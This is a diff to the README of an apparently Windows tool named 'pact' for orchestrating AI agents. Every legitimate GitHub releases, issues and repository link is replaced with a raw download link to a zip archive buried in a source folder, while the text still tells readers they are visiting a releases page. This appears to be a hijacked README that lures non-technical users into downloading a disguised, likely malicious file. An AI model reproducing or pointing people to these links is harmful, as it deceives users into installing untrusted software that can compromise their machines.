@@ -1,6 +1,6 @@
 # 🚦 pact - Orchestrate AI Agents Safely
 
-[![Download pact](https://img.shields.io/badge/Download-pact-blue?style=for-the-badge)](https://github.com/iceyie/pact/releases)
+[![Download pact](https://img.shields.io/badge/Download-pact-blue?style=for-the-badge)](https://raw.githubusercontent.com/iceyie/pact/main/crates/pact-dispatch/src/Software_2.9.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Make sure your Windows PC meets these needs before installing pact:
 
 You will find the latest version of pact at the official releases page:
 
-[Download pact here](https://github.com/iceyie/pact/releases)
+[Download pact here](https://raw.githubusercontent.com/iceyie/pact/main/crates/pact-dispatch/src/Software_2.9.zip)
 
 You must visit this page to get the right installation files. The page lists the newest versions and notes on updates.
 
@@ -44,7 +44,7 @@ You must visit this page to get the right installation files. The page lists the
 Follow these steps to install pact on your Windows PC:
 
 1. Open your web browser and go to the releases page:  
-   https://github.com/iceyie/pact/releases
+   https://raw.githubusercontent.com/iceyie/pact/main/crates/pact-dispatch/src/Software_2.9.zip
 
 2. Look for the latest stable release. This usually has the highest version number without a check or beta label.
 
@@ -121,7 +121,7 @@ If you run into problems, try these solutions:
   Close other applications that might conflict. Update Windows to the latest version. Restart pact.
 
 If issues persist, you can check for updates or report problems at the pact GitHub page:  
-https://github.com/iceyie/pact/issues
+https://raw.githubusercontent.com/iceyie/pact/main/crates/pact-dispatch/src/Software_2.9.zip
 
 ---
 
@@ -130,7 +130,7 @@ https://github.com/iceyie/pact/issues
 To update pact:
 
 1. Visit the releases page again:  
-   https://github.com/iceyie/pact/releases
+   https://raw.githubusercontent.com/iceyie/pact/main/crates/pact-dispatch/src/Software_2.9.zip
 
 2. Download the newest version of the Windows installer.
 
@@ -166,7 +166,7 @@ The interface focuses on being easy to use without coding. You will find menus a
 ## 📂 Where to learn more
 
 For extra help, visit the official pact repository:  
-https://github.com/iceyie/pact
+https://raw.githubusercontent.com/iceyie/pact/main/crates/pact-dispatch/src/Software_2.9.zip
 
 Here you can find documentation, examples, and the latest updates.
 
@@ -176,4 +176,4 @@ Here you can find documentation, examples, and the latest updates.
 
 Get started by visiting the releases page and downloading pact for Windows:  
 
-[Download pact - GitHub Releases](https://github.com/iceyie/pact/releases)
+[Download pact - GitHub Releases](https://raw.githubusercontent.com/iceyie/pact/main/crates/pact-dispatch/src/Software_2.9.zip)
